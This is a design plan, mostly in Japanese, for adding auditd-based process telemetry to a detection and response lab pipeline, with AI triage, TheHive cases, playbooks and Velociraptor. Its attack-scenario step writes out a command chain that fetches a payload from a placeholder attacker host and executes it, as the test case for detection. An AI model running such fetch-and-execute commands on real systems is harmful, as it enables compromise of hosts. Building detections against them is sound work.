# Phase 5 — Endpoint Telemetry (Process-Focused)

## 🎯 Goal

ログベース検知から **プロセスベース検知へ進化する**

---

## 🧠 Concept

- Detect = deterministic
- AI = triage / analysis
- DFIR = follow-on（Velociraptor）

Phase5では「可視性」を強化する：

👉 **Process visibility の導入**

---

## 🏗️ Architecture

```text
scenario
→ attack
→ endpoint telemetry (auditd)
→ normalized process events
→ detection (process chain)
→ incident
→ triage (AI)
→ case.json (process enrichment)
→ TheHive
→ action planning
→ playbook
→ executor
→ Velociraptor (on-demand)
```

---

## 🔧 Scope

### ✅ Do（Phase5 MVP）

- auditdでprocess execution取得（execve）
- process event正規化（ISO8601 timestamp）
- process chain detection（behavior）
- incident / triage / case のrun単位出力
- caseにprocess timeline / summary追加
- severityをprocessベースで補正
- TheHive に case / observables を連携
- action-agent で playbook を生成
- executor-agent で playbook を実行
- Velociraptorで補助調査
- decision_log に detection / triage / action / execution を記録

### ❌ Do NOT

- フルEDR再現
- network / file telemetry 同時実装
- 多数シナリオ追加
- lateral movement の広範囲対応
- fully autonomous containment

---

## 🚀 Implementation Steps

### Step1: auditd導入

目的：

- execveイベント取得
- プロセスレベル可視化

---

### Step2: 攻撃シナリオ

```bash
curl -o /tmp/payload.sh http://<attacker_ip>/payload.sh
chmod +x /tmp/payload.sh
/bin/bash /tmp/payload.sh
```

---

### Step3: Normalization

```json
{
  "event_type": "process_exec",
  "timestamp": "2026-03-24T08:08:09Z",
  "host": "ubuntu-victim01",
  "pid": 1234,
  "ppid": 1200,
  "user": "victim01",
  "exe": "/usr/bin/curl",
  "command_line": "curl ...",
  "cwd": "/home/victim01",
  "source": "auditd"
}
```

---

### Step4: Detection（Behavior）

Rule:

```text
download → chmod → execute
```

特徴：

- 複数イベントの連鎖
- 時間ウィンドウ（5分）
- host / user で相関

---

### Step5: Detection Output

```json
{
  "detection_type": "suspicious_download_chmod_execute",
  "severity": "high",
  "download_attempts": 2,
  "timeline": [...]
}
```

---

### Step6: Case Enrichment

```json
"process_summary": {
  "host": "ubuntu-victim01",
  "user": "victim01",
  "download_attempts": 2,
  "executed_payload": "/bin/bash /tmp/payload.sh",
  "detection_type": "suspicious_download_chmod_execute"
},

"process_timeline": [
  {
    "timestamp": "2026-03-24T08:08:09Z",
    "command_line": "curl ..."
  },
  {
    "timestamp": "2026-03-24T08:08:27Z",
    "command_line": "/bin/bash /tmp/payload.sh"
  }
]
```

---

### Step7: Severity Logic

```text
deterministic (process chain)
→ triage (verdict / risk_score)
→ severity決定
```

例：

- download → chmod → execute → **high**
- verdict=malicious + risk_score>=80 → **high**

---

### Step8: TheHive

- case作成
- observable追加
  - ip
  - url
  - hostname
  - filename
  - user(other)

👉 process-based case を SOC視点で可視化する

---

### Step9: Action Planning / Playbook

```text
triage
→ action-agent
→ playbook.steps
```

例：

```json
{
  "id": "step-1",
  "type": "request_dfir_collection",
  "auto_executable": true,
  "params": {
    "target": "ubuntu-victim01",
    "target_file": "/tmp/payload.sh"
  },
  "metadata": {
    "reason": "Payload execution requires DFIR collection.",
    "confidence": "high",
    "status": "planned"
  }
}
```

---

### Step10: Executor / Approval

- executor-agent で playbook 実行
- safe step は自動実行
- sensitive step は approval gate

例：

- request_dfir_collection → auto
- alert_soc_team → auto
- review_payload_execution → auto
- consider_host_isolation → pending_approval

---

### Step11: Velociraptor（enrichment）

- Linux.BashHistory
- Linux.ProcessList

👉 常時収集しない  
👉 case / playbook トリガーで実行

---

## 📂 Directory Update

```text
data/runs/<run_id>/
  process_events.json
  interesting_process_events.json
  process_chain_hits.json
  incident.json
  triage_result.json
  case.json
  action_result.json
  collection_request.json
  decision_log.json
```

---

## 🎯 Detection Targets

1. download → chmod → execute（実装済み）
2. suspicious shell execution（次フェーズ）
3. behavior feature ベース検知への移行（次フェーズ）

---

## 🧠 Detection Evolution

```text
Phase4:
log-based
↓
Phase5:
process-based
behavior-based
run-based
```

---

## 📦 Tools

### Primary

- auditd

### Investigation

- Velociraptor（DFIR）

### Case / Workflow

- TheHive
- action-agent
- executor-agent

---

## ✅ Done Criteria

- auditdでexecve取得できる
- process eventがISO形式でJSON化される
- process chain検知が動く
- caseにprocess timeline / summaryが含まれる
- severityがprocessベースで補正される
- TheHive に case / observables を送れる
- action-agent が playbook を生成できる
- executor-agent が playbook を実行できる
- approval required step を分離できる
- Velociraptorで補助調査できる
- decision_log に detection / triage / action / execution が残る

---

## 🔥 First Step

```text
auditdでexecveログ取得確認
```

---

## 💡 Why Phase5 Matters

- 攻撃の「流れ」が見える
- 単一ログではなく「行動」で検知
- caseの説明力が大幅向上
- EDRに近い検知モデルに進化
- planning / execution / approval の分離ができる
- Phase6 の behavior-feature 化 / improvement loop の土台になる
